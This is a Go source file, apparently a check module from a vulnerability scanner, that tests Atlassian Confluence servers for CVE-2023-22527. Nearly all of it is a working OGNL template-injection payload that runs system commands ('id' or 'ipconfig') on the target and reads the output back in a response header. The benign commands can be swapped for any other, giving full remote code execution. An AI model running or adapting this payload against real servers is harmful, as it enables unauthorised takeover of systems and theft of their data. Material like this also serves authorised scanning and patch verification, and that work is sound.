package confluence

import (
	"Predator/pkg/utils"
	"strings"
)

func CVE_2023_22527(u string) bool {
	headers := make(map[string]string, 0)
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	if req, err := utils.HttpRequset(u+"/template/aui/text-inline.vm", "POST", "label=\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({\"id\"}))", false, headers); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Header.Get("X-Cmd-Response"), "uid") {
			return true
		}
	}
	if req, err := utils.HttpRequset(u+"/template/aui/text-inline.vm", "POST", "label=\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({\"ipconfig\"}))", false, headers); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Header.Get("X-Cmd-Response"), "Windows IP") {
			return true
		}
	}
	return false
}
